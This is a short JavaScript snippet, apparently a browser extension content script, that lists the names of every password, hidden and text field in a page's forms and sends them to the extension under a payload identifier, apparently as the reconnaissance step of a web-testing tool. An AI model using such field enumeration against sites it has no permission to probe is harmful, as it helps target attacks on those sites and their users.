
var name = "";
var pref = "";

for(var i = 0; i < document.forms.length; i++) {
	var form = document.forms[i];
	var inputs = document.forms[i].elements;
	for(var j = 0; j < inputs.length; j++) {


		if(inputs[j] && inputs[j].name.length > 0 && (inputs[j].type == 'password' || inputs[j].type == 'hidden' || inputs[j].type == 'text')) {
			name+=pref+inputs[j].name
			pref=",";
	
		}
	}
}
		
chrome.extension.sendRequest({input_names:name,payloadid:"inputfind"}, function(response) {

});


